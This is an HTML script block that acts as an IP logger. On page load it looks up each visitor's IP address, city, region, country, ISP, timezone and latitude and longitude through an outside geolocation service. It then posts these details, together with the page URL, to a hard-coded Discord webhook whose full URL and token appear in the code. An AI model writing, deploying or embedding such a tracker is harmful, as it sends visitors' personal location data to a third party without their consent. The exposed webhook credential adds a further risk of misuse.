<script>
window.addEventListener("load", async () => {
  const webhookURL = "https://discord.com/api/webhooks/1472349277383692512/NqRV69JT5JC1q0Po5ggWVEbcztZ1SAS6M_M_mU7YNZVkxoj8mzRu7xPZPNaeHWmicKTe";
  function logMessage(message, color = "black") {
    const pre = document.createElement("pre");
    pre.style.color = color;
    pre.style.background = "#f0f0f0";
    pre.style.padding = "5px";
    pre.textContent = message;
    document.body.appendChild(pre);
  }

  try {
    logMessage("Fetching IP info...", "blue");

    const res = await fetch("https://ipwho.is/");
    if (!res.ok) throw new Error(`IP API failed: ${res.status}`);

    const data = await res.json();
    if (!data.success) throw new Error("IP lookup failed");

    logMessage("IP info fetched successfully ‚úÖ", "green");

    const payload = {
      content:
        `üåç Visit Detected\n\n` +
        `IP: ${data.ip}\n` +
        `City: ${data.city}\n` +
        `Region: ${data.region}\n` +
        `Country: ${data.country}\n` +
        `ISP: ${data.connection?.isp || "Unknown"}\n` +
        `Timezone: ${data.timezone?.id || "Unknown"}\n` +
        `Latitude: ${data.latitude}\n` +
        `Longitude: ${data.longitude}\n` +
        `Page: ${window.location.href}`
    };

    logMessage("Sending to webhook...", "blue");

    await fetch(webhookURL, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    logMessage("‚úÖ Sent to webhook!", "green");

  } catch (err) {
    logMessage(`‚ùå Error: ${err.message}`, "red");
  }
});
</script>
